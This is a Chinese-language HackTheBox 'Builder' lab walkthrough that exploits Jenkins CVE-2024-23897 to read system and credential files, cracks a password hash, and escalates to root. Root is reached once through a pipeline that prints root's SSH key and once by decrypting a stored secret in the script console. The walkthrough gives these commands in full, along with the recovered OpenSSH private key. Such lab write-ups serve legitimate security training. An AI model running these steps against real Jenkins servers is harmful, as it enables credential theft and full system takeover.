---
title: 'HackTheBox: Builder'
disqus: hackmd
---

HackTheBox: Builder
===

## Topic

### Lab 
1.	輸入sudo openvpn lab_iming0727.ovpn ，開啟VPN連線到HTB，並確認VPN連線的IP
 

2.	執行下列指令掃描靶機開啟的Port，並將結果存到ports變數。
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.10 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 
指令解釋
這條指令由多個部分組成，逐步進行端口掃描並處理結果。以下是每個部分的解釋：

1. nmap -p- --min-rate=1000 -T4 10.10.11.10
    -nmap: 使用 Nmap 網路掃描工具。
    --p-: 掃描所有端口（1-65535）。
    ---min-rate=1000: 設定最小速率為每秒 1000 個封包，以加快掃描速度。
    --T4: 使用 T4 設定加速掃描，增加掃描速度。

2.| grep ^[0-9]
    -|: 管道符號，用來將前一個指令的輸出作為下一個指令的輸入。
    -grep ^[0-9]: 過濾出以數字開頭的行，這些行代表發現的端口。

3.| cut -d '/' -f 1
    -cut -d '/' -f 1: 使用 '/' 作為分隔符號，取出每行的第一部分，即端口號。

4.| tr '\n' ','
    -tr '\n' ',': 將每行的換行符號替換為逗號，使端口號變成以逗號分隔的一行。

5.| sed s/,$//
    -sed s/,$//: 使用 sed 將行尾的逗號刪除。

6.ports=$(...)
    - 將上述處理過的結果賦值給變數ports`。


3.	使用下列指令利用 nmap 掃描特定的端口，並進行服務版本探測及使用預設腳本掃描。透過下列掃描結果，發現靶機中有開啟SSH and Jenkins服務。
nmap -p$ports -sV -sC 10.10.11.10
 

1. nmap
    - 使用 Nmap 網路掃描工具。

2. -p$ports
    - -p: 指定要掃描的端口。
    - $ports: 使用第一條指令生成的端口清單。

3. -sV
    - 啟用服務版本探測，以確定每個開放端口上運行的應用程序名稱和版本。

4. -sC
    - 使用 Nmap 預設腳本進行掃描，這些腳本執行常見的任務，如檢查漏洞、服務識別等。

5. 10.10.11.10
    - 要掃描的目標 IP 位址。

4.	開啟http://10.10.11.10:8080網頁，可以發現Jekins版本。
 
5.	在Goolge 中輸入關鍵字【cve jenkins 2.4.4.1】 ，可以找到可以用的漏洞。

 

6.	進入到搜尋到的下列的Github網址，可以看到利用這個漏洞來下載檔案。但是直接使用這個Github的Python程式，無法順利執行。
https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability，
 
 

7.	繼續搜尋，可以找到下列網址中找到利用【java -jar jenkins-cli.jar -s http://10.10.11.10:8080 @/etc/passwd】指令來下載密碼檔案。
https://github.com/3yujw7njai/CVE-2024-23897
 

8.	參考下列網址的資料，我們發覺可以直接到靶機上下載jekins-cli.jar，及執行語法
https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client
 
9.	執行下列指令下載jenkins-cli.jar
wget 10.10.11.10:8080/jnlpJars/jenkins-cli.jar
 
10.	執行下列指令下載/etc/passwd，但是出現錯誤訊息。但是有出現部分應該有關使用者資訊，所以代表這個漏洞是可以利用的。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/etc/passwd"
 

11.	執行下列指令下載environ環境變數，可以看到環境變數，但是資料有點亂。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/proc/self/environ"
 

12.	複製可能是environ環境變數的內容，利用ChatGPT分析，提示詞如下
分析並整理下列Unix系統文字
HOSTNAME=0f52c222a4ccJENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsCOPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_UC=https://updates.jenkins.ioSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.
 

13.	根據上個步驟ChatGPT的訊息，可以得知主機名稱為亂數，這代表這個服務是架設在Docker容器，Jenkins服務所在的目錄位在/var/jenkins_home
 
 

14.	輸入下列指令，獲得在使用者jenkins 使用者家目錄下的Flag。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/user.txt"
user.txt：c45872e1ad846a8abe2503846ff716d7
 

15.	因為靶機的Jenkins的服務是建立在Docker容器，所以參考下列網頁，嘗試建立一個官方Jenkins的Docker 容器，用以更加了解Docker 容器。
https://github.com/jenkinsci/docker

16.	為了避免無法安裝Jenkins容器，在安裝Jenkins容器前先執行下列指令，更新Kali
sudo apt update
17.	為了避免無法安裝Jenkins容器，在安裝Jenkins容器前先執行下列指令，升級Kali系統。
sudo apt upgrade
18.	輸入下列指令，下載jenkins容器。
docker pull jenkins/jenkins:lts-jdk17
 
19.	輸入下列指令，啟動jenkins容器。
sudo docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
 
20.	在容器啟動的訊息可以看到第一次登入Jenkins伺服器的密碼
 
21.	開啟FireFox，連線到http://127.0.0.1:8080/，輸入上一個步驟所得到的密碼
 
22.	為了加快安裝速度，選擇自訂安裝Plugin。
 

23.	選擇不安裝任何Plugin
 
24.	建立一個使用者名稱為Yiming，密碼為Password，全名為Eric Lin
 
25.	進行儲存設定與安裝
 

26.	執行下列指令確認Jenkins容器的啟動狀況與容器ID
docker ps
27.	根據容器ID，執行下列指令登入到容器
docker exec -it 【容器ID】bash
 

28.	登入到Jenkins的家目錄，並列出Jenkins的家目錄的內容，並且看到有一個名稱為users的資料夾，裡面可能有存放使用者的資料。
 

29.	進入到users目錄，看到有一個目錄開頭是使用者名稱，及一個users.xml檔案。users.xml檔案內容是紀錄所在資料夾的名稱，另外使用者帳號的名稱全部改成小寫，因此有可能儘管我們使用者輸入Yiming，但是系統將帳號名稱改為yiming。

 

 


30.	登入http://127.0.0.1:8080，確認登入的試用者帳號為yiming，而不是輸入的Yiming。

 

31.	進入名稱開頭為使用者帳號的目錄，目錄中有一個檔案config.xml。檢視config.xml，可以看到欄位中有我們輸入的使用者資料，另外也看到有一個passwordHash欄位，裡面可能存放的是密碼的Hash值。

 
 

32.	複製passwordHash欄位的值，然後離開容器的CLI介面。
 

33.	將複製passwordHash欄位的值，儲存到hash.txt
 

34.	使用john破解密碼，確認可以利用john破解Jenkins容器的使用者密碼
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 

35.	使用下列指令關閉所有執行中的容器服務，並確認所有的容器服務已經停止
docker stop $(docker ps -aq)
docker ps
 

36.	使用下列指令刪除所有容器，並確認所有的容器已經被刪除
docker rm $(docker ps -aq)
docker container ls

 

37.	使用下列指令刪除所有容器影像檔，並確認所有的容器影像檔已經被刪除
docker image ls
docker rmi $(docker images -q)


 

 

38.	使用下列指令嘗試下載users.xml，但是失敗。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' help "@/var/jenkins_home/users/users.xml"
 

39.	查詢說明文件，改用下列指令獲取users.xml的資訊，並得知登入帳號為jennifer及存放jennifer帳號資料所在的資料夾。
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' connect-node "@/var/jenkins_home/users/users.xml"
 
40.	下載jennifer帳號資料夾中的config.xml，來獲得jennifer帳號密碼的Hash值
java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.10.11.10:8080' connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"

 
 

41.	修改hash值，放到hash.txt，然後使用john破解，得知密碼為princess。
 

42.	登入靶機的Jenkins服務網址(http://10.10.11.10:8080)。
 


 

43.	登入成功後有2種方式，可以提升權限，先介紹第一種。尋找到Credentials管理介面，確認使用者的登入資訊。

 

 

44.	到Credentials管理介面，確認裡面有存放root的帳號及密碼。
 

45.	到Plugins介面，確認系統有安裝哪一些Plugin
 


 



46.	確認有安裝SSH Agent Plugin。

 
47.	新增一個名稱為Yiming的Pipeline。
 

 

 

48.	在新增的Pipeline中輸入下列程式碼。


pipeline {
    agent any
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10 "cat /root/.ssh/id_rsa"'
                        
                    }
                    
                }
                
            }
            
        }
        
    }
    
}


 
49.	建立Yiming這個Pipeline，並檢視建立後的Log。
 

 


 
50.	檢視輸出結果，可以看到登入的私鑰內容，私鑰內容如下所示。
 



-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

51.	複製私鑰。
 

52.	將私鑰內容放到pk.txt。
 

53.	設定pk.txt權限，並利用pk.txt，以root身分利用SSH登入系統。
 

54.	確認登入帳號，並印出root.txt的Flag內容。
eac7b0b0e72fdb3bd19819ffce449f6f
 

55.	現在介紹第二種提升權限的方式。尋找到Credentials管理介面，點選修改資料的按鈕。
 
 
56.	按下F12，然後根據下圖的步驟要求，可以找到隱藏的私鑰Hash值
 

57.	根據下圖複製含有私鑰Hash的HTML程式碼，複製到的結果如下所示。
 


<input name="_.privateKey" type="hidden" value="{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}">

58.	點選到Script介面，利用hudson.util.Secret.decrypt函數來進行解密，並獲得私鑰。
 

 



 

println( hudson.util.Secret.decrypt("{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}"))




59.	將私鑰內容放到pk.txt。

60.	設定pk.txt權限，並利用pk.txt，以root身分利用SSH登入系統。
 

61.	確認登入帳號，並印出root.txt的Flag內容。
eac7b0b0e72fdb3bd19819ffce449f6f
 

